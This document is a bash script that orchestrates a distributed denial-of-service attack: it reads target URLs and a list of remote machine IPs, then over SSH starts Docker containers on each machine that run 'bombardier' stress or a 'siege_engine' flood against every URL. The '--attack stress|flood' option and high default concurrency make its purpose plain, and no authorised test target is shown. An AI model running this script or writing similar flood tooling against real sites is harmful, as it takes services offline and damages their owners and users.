
usage() {
    cat <<EOF
bash $1 --url list.txt [--nj 1000] [--attack stress|flood]
EOF
}


url_list=""
nj="1000"
attack="stress"
while [ "$1" != "" ]; do
    case $1 in
        --url )
            shift
            url_list=$1
        ;;
        --nj )
            shift
            nj=$1
        ;;
        --attack )
            shift
            attack=$1
        ;;
        -h | --help ) usage $0
            exit
        ;;
        * ) usage $0
            exit 1
    esac
    shift
done
if [ ! -f $url_list ]; then
  echo "cant open url list $url_list"
  exit 1
fi
urls_num=$(wc -l $url_list | awk '{print $1}')

ips_path="ips.txt"
if [ ! -f "$ips_path" ]; then
  ips_path="aws/ips.txt"
fi
if [ ! -f "$ips_path" ]; then
  echo "cant find ips.txt"
  exit 1
fi
nj_per_machine=$(echo $((nj / urls_num)))

for url in $(cat $url_list); do
  for ip in $(cat $ips_path); do
    if [ "$attack" == "stress" ]; then
      ssh ubuntu@${ip} docker run -d mack/battle-tools bombardier -c $nj_per_machine -l $url
    elif [ "$attack" == "flood" ]; then
      ssh ubuntu@${ip} docker run -d mack/battle-tools python3 -m siege_engine $nj_per_machine $url
    else
      echo "unknown attack type ${attack}"
    fi
  done
done
